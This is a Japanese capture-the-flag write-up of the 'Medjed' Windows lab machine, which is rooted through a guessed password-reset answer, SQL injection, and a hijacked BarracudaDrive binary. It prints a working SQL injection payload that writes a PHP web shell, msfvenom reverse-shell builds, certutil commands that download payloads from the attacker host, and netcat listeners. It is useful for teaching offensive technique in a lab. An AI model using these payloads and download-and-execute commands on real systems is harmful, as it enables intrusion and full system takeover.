+++
title = "Proving Grounds Practice - Medjed Writeup"
date = "2026-10-22"
description = "Ruby on Rails製Webアプリケーションに存在するSQLインジェクションを悪用してWebシェルを設置し、BarracudaDrive v6.5のInsecure Folder Permissions脆弱性を利用してNT AUTHORITY\\SYSTEMを取得"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[Medjed]", "[SQL Injection]", "[Password Reset Bypass]", "[File Upload RCE]", "[Insecure Folder Permissions]", "[BarracudaDrive]", "[hard]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Medjed |
| OS | Windows |
| Community Rating | Hard |
| Target IP | 192.168.114.127 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全TCPポートを対象としたスキャンを実施する。

```bash
nmap -Pn -p- -sV 192.168.114.127
```

スキャン結果は以下のとおり。

```text
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
8000/tcp  open  http-alt      BarracudaServer.com (Windows)
30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
33033/tcp open  unknown
44330/tcp open  ssl/unknown
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
49664-49669/tcp open msrpc    Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

ポート33033と45332のフィンガープリント文字列から、以下のことが判明した。

- ポート8000: `BarracudaServer.com (Windows)` が稼働している（BarracudaDriveを示唆）
- ポート33033: Ruby on Rails (`Action Controller: Exception caught`) で構築されたWebアプリケーションが稼働している
- ポート45332/45443: Apache httpd 2.4.46 (Win64, OpenSSL/1.1.1g, PHP/7.3.23)

---

## Enumeration

### Anonymous FTP (port 30021)

FTPポート30021に対してAnonymousログインを試みる。

```bash
ftp 192.168.114.127 -p 30021
```

```text
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
Name: anonymous
230 Logged on
```

Anonymousログインが許可されており、以下のRuby on Railsプロジェクトのファイル一式が公開されていた。

```text
-r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
-r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
-r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
-r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
-r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
-r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
```

このファイル構成から、ポート33033または45332/45443で稼働するWebアプリケーションのソースと推測されるが、FTP自体からはこれ以上の侵入経路は得られなかった。

### Web Services (44330 / 45332 / 45443 / 33033)

ブラウザで以下のURLにアクセスし、各ポートのサービスを確認した。

```text
https://192.168.114.127:44330/Config-Wizard/wizard/SetAdmin.lsp
http://192.168.114.127:45332/
http://192.168.114.127:45443/
http://192.168.114.127:33033/
```

ポート44330はBarracudaDriveの管理用Config Wizardであることが判明した。

### GoBuster - port 45332

ポート45332に対してディレクトリ・ファイルのブルートフォースを実施する。

```bash
gobuster dir -u http://192.168.114.127:45332 -w /usr/share/wordlists/dirb/common.txt
```

結果は以下のとおり。

```text
.htaccess             (Status: 403) [Size: 308]
.hta                  (Status: 403) [Size: 308]
.htpasswd             (Status: 403) [Size: 308]
aux                   (Status: 403) [Size: 308]
cgi-bin/              (Status: 403) [Size: 308]
com3                  (Status: 403) [Size: 308]
com2                  (Status: 403) [Size: 308]
com1                  (Status: 403) [Size: 308]
con                   (Status: 403) [Size: 308]
examples              (Status: 503) [Size: 408]
index.html            (Status: 200) [Size: 887]
licenses              (Status: 403) [Size: 427]
lpt2                  (Status: 403) [Size: 308]
lpt1                  (Status: 403) [Size: 308]
nul                   (Status: 403) [Size: 308]
phpmyadmin            (Status: 403) [Size: 308]
phpinfo.php           (Status: 200) [Size: 90801]
prn                   (Status: 403) [Size: 308]
server-status         (Status: 403) [Size: 427]
server-info           (Status: 403) [Size: 427]
webalizer             (Status: 403) [Size: 308]
```

`/phpinfo.php` が200を返しており、このファイルから有用な情報を取得できる。

### phpinfo.php によるドキュメントルートの特定

```bash
curl http://192.168.114.127:45332/phpinfo.php
```

出力から `DOCUMENT_ROOT` を確認する。

```text
DOCUMENT_ROOT => C:/xampp/htdocs
```

後のファイル書き込みに利用するため、このパスを記録しておく。

### Port 33033 アプリケーション調査

ポート33033にアクセスすると、チームメンバーのプロフィール写真・モットー・メールアドレスの一覧が表示される。

取得できたメールアドレス一覧は以下のとおり。

```text
evren.eagan@company.com
joe.webb@company.com
jerren.devops@company.com
kenneth.dooley@company.com
laura.lauer@company.com
christopher@company.com
```

一覧の中でも `jerren.devops@company.com` のプロフィールは、モットーが **"Only the paranoid survive"** という特徴的な内容になっており、注目に値する。

ページ右上の **Login** リンクからログイン画面に遷移すると、**Forgot Password** 機能が存在することを確認した。

```text
http://192.168.114.127:33033/users/reminder
```

このフォームには以下の3つの入力欄が存在する。

- Username
- Reminder（合言葉やフレーズを入力する欄で、認証確認の役割を果たしていると思われる）
- New Password

---

## Exploitation

### アプリケーションユーザーのパスワードリセット

収集したユーザー名とメールアドレスをもとに、Reminder欄の値を推測する。モットーである `Only the paranoid survive` をそのまま入力しても失敗したため、文言を簡略化し、キーワード `paranoid` のみを入力したところ成功した。

```text
Username: jerren.devops
Reminder: paranoid
New Password: password
```

送信すると **Password was successfully updated** と表示され、ログイン画面にリダイレクトされた。これにより、`jerren.devops:password` の認証情報でログイン可能になった。

```text
http://192.168.114.127:33033/login
```

### SQLインジェクションの発見

ログイン後、ユーザーID（`http://192.168.114.127:33033/users/4`）のパスパラメータを改ざんすることで、他ユーザー（Evren Eaganなど）の編集画面にも遷移できることを確認した。

```text
http://192.168.114.127:33033/users/4
http://192.168.114.127:33033/users/4/edit
http://192.168.114.127:33033/users/1/edit
```

プロフィール編集画面（`/users/1/edit`）の下部には **Request Profile SLUG (experimental)** というリンクが存在し、クリックすると以下のURLに遷移する。

```text
http://192.168.114.127:33033/slug
```

このページには、URL文字列を受け付ける単一のフィールドがあり、フォーム上部に `#<Mysql2::Result:0x000...>` という不審な文字列が表示されている。データベース（Mysql2）に関連する文字列であることから、SQLインジェクションの可能性を疑い、シングルクォート（`'`）を1つだけ入力して送信した。

その結果、赤いSQLエラーメッセージが表示され、SQLインジェクション脆弱性の存在が確認できた。エラーメッセージから、脆弱なクエリの内容も判明した。

```ruby
sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"
```

### RCE（Webシェルの設置）

先に特定したドキュメントルート（`C:/xampp/htdocs`）に対し、SQLインジェクションを利用してPHP Webシェルを書き込む。UNION SELECTクエリを使用した。

```sql
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
```

このペイロードを `/slug` フォームの `URL` パラメータとして送信すると、以下のようなURLとなった。

```text
http://192.168.114.127:33033/slug?URL=%27+UNION+SELECT+%28%22%3C%3Fphp+echo+passthru%28%24_GET%5B%27cmd%27%5D%29%3B%22%29+INTO+OUTFILE+%27C%3A%2Fxampp%2Fhtdocs%2Fcmd.php%27++--+-%27
```

書き込みが成功しているかを、ポート45332経由で `cmd.php` にアクセスして確認する。

```bash
curl "http://192.168.114.127:45332/cmd.php?cmd=dir"
```

```text
 Volume in drive C has no label.
 Volume Serial Number is A41E-B108

 Directory of C:\xampp\htdocs

10/21/2026  11:51 AM    <DIR>          .
10/21/2026  11:51 AM    <DIR>          ..
10/21/2026  11:51 AM                35 cmd.php
11/03/2020  02:13 PM               887 index.html
11/03/2020  02:16 PM                21 phpinfo.php
11/03/2020  02:13 PM             3,023 script.js
11/03/2020  02:14 PM             1,266 styles.css
               5 File(s)          5,232 bytes
               2 Dir(s)  16,488,034,304 bytes free
```

`dir` コマンドの実行結果が返ってきたことから、Webシェルによるリモートコード実行が可能であることが確認できた。

### シェルの取得

まず、msfvenomでリバースシェルペイロードを作成する。

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=30021 -f exe -o shell.exe
```

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
```

次に、攻撃用マシン上でPythonのHTTPサーバーを起動し、ペイロードを配信する。

```bash
python3 -m http.server 45332
```

Webシェル経由で `certutil` を使用し、ターゲットにペイロードをダウンロードさせる。コマンドはURLエンコードして送信する。

```bash
curl "http://192.168.114.127:45332/cmd.php?cmd=certutil%2Eexe%20%2Durlcache%20%2Df%20http://192%2E168%2E45%2E242:45332/shell%2Eexe%20shell%2Eexe"
```

リバース接続を待ち受けるため、Netcatリスナーを起動する。

```bash
nc -lvnp 30021
```

Webシェル経由でダウンロードしたペイロードを実行すると、以下のとおりシェルが返ってきた。

```text
listening on [any] 30021 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.114.127] 51947
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>
```

---

## Privilege Escalation

### ローカル列挙

C:\ドライブを調査すると、`C:\bd` という気になるフォルダが存在する。

```text
C:\> dir
01/21/2021  05:48 AM    <DIR>          bd
11/03/2020  10:46 AM    <DIR>          FTP
10/16/2020  12:49 PM    <DIR>          PerfLogs
```

```text
C:\bd> dir
01/21/2021  05:48 AM    <DIR>          .
01/21/2021  05:48 AM    <DIR>          ..
11/03/2020  09:29 AM    <DIR>          applications
11/03/2020  09:29 AM                38 bd.conf
11/03/2020  09:29 AM               259 bd.dat
04/26/2013  02:55 PM         1,661,648 bd.exe
06/12/2011  01:49 PM               207 bd.lua
04/26/2013  02:55 PM           912,033 bd.zip
06/14/2012  09:21 AM            33,504 bdctl.exe
11/03/2020  09:29 AM    <DIR>          cache
11/03/2020  09:29 AM    <DIR>          cmsdocs
11/03/2020  09:29 AM    <DIR>          data
12/03/2010  01:52 PM             5,139 install.txt
10/26/2010  01:38 PM           421,200 msvcp100.dll
10/26/2010  01:38 PM           770,384 msvcr100.dll
02/18/2013  07:39 PM           240,219 non-commercial-license.rtf
01/21/2021  05:48 AM                 6 pidfile
04/26/2013  02:50 PM            16,740 readme.txt
11/03/2020  09:29 AM               702 roles.dat
06/14/2012  09:21 AM           383,856 sqlite3.exe
11/03/2020  09:29 AM    <DIR>          themes
01/21/2021  05:48 AM    <DIR>          trace
11/03/2020  09:29 AM           133,107 Uninstall.exe
```

`readme.txt` の内容から、`bd` は **BarracudaDrive** を指しており、バージョンは **v6.5** であることが判明した（先に確認した8000番ポート、44330番ポートのサービスと一致する）。

### BarracudaDrive v6.5 - Insecure Folder Permissions

既知の脆弱性を調査したところ、BarracudaDrive v6.5には **Insecure Folder Permissions** の脆弱性が存在することが判明した。`icacls` コマンドで実際のアクセス権を確認する。

```text
C:\bd> icacls .
. BUILTIN\Administrators:(I)(OI)(CI)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  NT AUTHORITY\Authenticated Users:(I)(M)
  NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files
```

`NT AUTHORITY\Authenticated Users` に対して `(M)`（変更権限）が付与されていることが確認でき、SYSTEM権限で動作する `bd.exe` 自体を自分のファイルで上書きできることが分かった。

### bd.exe の差し替え

まず、元のバイナリをリネームしてバックアップする。

```text
C:\bd> move bd.exe bd.2.exe
```

次に、33033番ポート向けのリバースシェルペイロードを作成する。

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=33033 -f exe -o shell1.exe
```

`certutil` でターゲットにダウンロードさせる。

```text
certutil.exe -urlcache -f http://192.168.45.242:45332/shell1.exe shell1.exe
```

ダウンロードしたペイロードを `bd.exe` としてリネームし、正規のBarracudaDriveバイナリを置き換える。

```text
C:\bd> move shell1.exe bd.exe
```

### 再起動とSYSTEMシェルの取得

BarracudaDriveはSYSTEM権限で動作するサービスとして自動起動する設定になっているため、ターゲットを再起動することで、差し替えた `bd.exe`（リバースシェル）がSYSTEM権限で実行される。

```text
C:\bd> shutdown /r
```

攻撃側でリバースシェル用のポートに対してNetcatリスナーを起動し、再起動を待つ。

```bash
nc -lvnp 33033
```

再起動後、以下のとおり接続が確立した。

```text
listening on [any] 33033 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.114.127] 49668
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

権限を確認する。

```powershell
whoami
```

```text
nt authority\system
```

`NT AUTHORITY\SYSTEM` の権限を取得し、権限昇格に成功した。

---

## Summary

Ruby on Rails製Webアプリケーション（ポート33033）に対し、推測によるReminder欄の突破でユーザーアカウントのパスワードをリセットし、ログインに成功した。ログイン後、プロフィール編集画面から到達可能な `/slug` エンドポイントにSQLインジェクション脆弱性を発見し、`UNION SELECT ... INTO OUTFILE` を用いて、Apache（ポート45332）のドキュメントルートにPHP Webシェルを書き込み、リモートコード実行を達成した。

Webシェル経由で `certutil` によりリバースシェルペイロードをダウンロード・実行し、ユーザー `jerren` としての初期アクセスを取得した。その後のローカル列挙で `C:\bd` に設置されたBarracudaDrive v6.5を発見し、Insecure Folder Permissionsの脆弱性（`icacls` によるアクセス権の緩さ）を悪用して、SYSTEM権限で起動する `bd.exe` を自作のリバースシェルバイナリに差し替え、ターゲットの再起動をもって `NT AUTHORITY\SYSTEM` の権限を取得した。

攻略の流れは以下のとおり。

1. Nmapによるポート・サービスの列挙（33033: Rails, 45332/45443: Apache+PHP, 8000/44330: BarracudaDrive, 30021: FTP）
2. Anonymous FTPによるRailsアプリケーションソース一式の取得
3. phpinfo.phpからのドキュメントルート（`C:/xampp/htdocs`）特定
4. ポート33033のプロフィール一覧からユーザー名・メールアドレスを収集
5. Forgot Password機能のReminder欄の推測によるパスワードリセット（`jerren.devops` / `paranoid`）
6. ログイン後、`/slug` エンドポイントにてSQLインジェクションを発見
7. `UNION SELECT ... INTO OUTFILE` によるPHP Webシェルの書き込み
8. Webシェル経由で `certutil` によりリバースシェルペイロードをダウンロード・実行し、初期アクセス（`jerren`）を取得
9. ローカル列挙でBarracudaDrive v6.5（`C:\bd`）を発見
10. `icacls` でInsecure Folder Permissionsを確認し、`bd.exe` をリバースシェルペイロードに差し替え
11. ターゲットの再起動により、SYSTEM権限で動作する `bd.exe`（差し替え後のペイロード）が実行され、`NT AUTHORITY\SYSTEM` を取得

